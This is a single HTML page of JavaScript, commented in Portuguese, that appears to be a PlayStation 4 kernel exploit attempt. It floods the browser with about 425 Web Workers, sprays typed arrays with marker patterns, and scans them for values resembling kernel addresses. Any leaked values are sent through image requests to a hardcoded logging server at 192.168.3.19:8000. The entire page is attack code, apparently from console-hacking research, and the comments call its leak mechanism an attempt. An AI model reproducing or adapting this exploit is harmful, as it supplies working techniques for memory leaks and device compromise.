<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 SLOW-MO HUNTER</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 2px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        .danger { color: #f00; border-color: #f00; background: #200; }
        .safe { color: #0f0; border-color: #0f0; }
    </style>
</head>
<body>

    <h1>SLOW-MO HUNTER (ACTIVE TRAP)</h1>
    <div id="status">VERIFIQUE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // <--- SEU IP
        const SERVER_PORT = "8000";
        
        const THRESHOLD = 400;     // Onde começa o perigo
        const MAX_THREADS = 425;
        const STRUCT_SIZE = 128;   // 512 bytes
        const PATTERN = 0xDEADBEEF; // Padrão fácil de ver

        let workers = [];
        let traps = []; // Armadilhas de memória
        let slowMode = false;
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);

        function start() {
            if(SERVER_IP.includes("XX")) return alert("IP ERRADO");
            
            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nACELERANDO...`;
            document.getElementById('status').className = "safe";
            logToAndroid("INICIO_SLOW_MO");

            // Começa rápido (30ms)
            nextThread(30);
        }

        function nextThread(delay) {
            setTimeout(() => {
                // Para se já vazou ou passou do limite
                if (workers.length >= MAX_THREADS) return;

                // 1. Cria Thread
                workers.push(new Worker(url));
                
                // Atualiza tela
                if(workers.length % 10 === 0) {
                    document.getElementById('status').innerText = `THREADS: ${workers.length}`;
                }

                // 2. LÓGICA DE PERIGO (400+)
                if (workers.length >= THRESHOLD) {
                    if (!slowMode) {
                        slowMode = true;
                        document.getElementById('status').className = "danger";
                        document.getElementById('status').innerText = "ZONA DE PERIGO! CÂMERA LENTA...";
                        logToAndroid("ENTRANDO_SLOW_MODE_400");
                    }

                    // AÇÃO CRÍTICA: Cria NOVA armadilha de memória AGORA
                    // Isso tenta pegar o endereço que o Kernel acabou de corromper
                    try {
                        let trap = new Uint32Array(STRUCT_SIZE);
                        trap.fill(PATTERN);
                        trap[0] = 0x13371337; // Marca
                        traps.push(trap);
                        
                        // ESCANEAR IMEDIATAMENTE (SÓ AS NOVAS)
                        scanTraps();
                    } catch(e) {}

                    // RECARREGA COM DELAY ALTO (250ms)
                    // Dá tempo pro scanner rodar e pro Kernel vazar antes do próximo passo
                    nextThread(250); 
                } else {
                    // RECARREGA RÁPIDO (30ms)
                    nextThread(30);
                }

            }, delay);
        }

        function scanTraps() {
            // Varre as últimas 50 armadilhas criadas (as mais recentes são as mais prováveis)
            let startIdx = Math.max(0, traps.length - 50);
            
            for(let k=startIdx; k < traps.length; k++) {
                const arr = traps[k];
                
                // Otimização: Olha só os índices críticos primeiro
                if(arr[0] !== 0x13371337 || arr[16] !== PATTERN || arr[32] !== PATTERN) {
                    // ALGO MUDOU!
                    for(let i=0; i < STRUCT_SIZE; i++) {
                        let val = arr[i];
                        if (val !== PATTERN && val !== 0x13371337 && val !== 0) {
                            
                            // CONVERTE E ENVIA
                            let hex = (val >>> 0).toString(16).padStart(8, '0');
                            
                            // Se parece um endereço de Kernel (começa com 8...)
                            if(hex.startsWith("8") || hex.startsWith("f")) {
                                logToAndroid(`LEAK_OFFSET_${i*4}_VAL_${hex}`);
                                document.body.style.background = "#fff";
                                
                                // Tenta enviar o vizinho (parte alta 64-bit)
                                if(i+1 < STRUCT_SIZE) {
                                    let high = (arr[i+1] >>> 0).toString(16);
                                    logToAndroid(`HIGH_${high}`);
                                }
                                return; // Já enviou, sai para ser rápido
                            }
                        }
                    }
                }
            }
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
